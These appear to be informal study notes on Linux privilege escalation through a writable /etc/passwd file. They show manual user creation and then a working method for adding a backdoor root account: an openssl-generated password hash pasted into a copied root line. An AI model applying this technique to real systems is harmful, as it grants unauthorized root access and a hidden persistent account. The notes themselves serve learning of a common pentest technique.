multiple method of priv escaltion by writable etc/passwd
etc/passwd contains information of user accounts in linux.
add new user1
user1:x:1002:1002:,,,:/home/user1:/bin/bash ...new user1 created checked by cat/etc/passwd
manually adding user in etc/passwd file 
user2:x:1003:1003:,,,:/home/user2:/bin/bash
set passwrd for user 2
passwd user2
now i have 2 users user 1 and user2

i found that etc/password is writable i will open that file and own user3 having root permissions.
openssl passwd -1 -salt user3 pass123
$1$user3$rAGRVf5p2jYTqtqOW5cPu/
just copy paste the root line and change the root into user3 and x into the salt password value generated by oopenssl
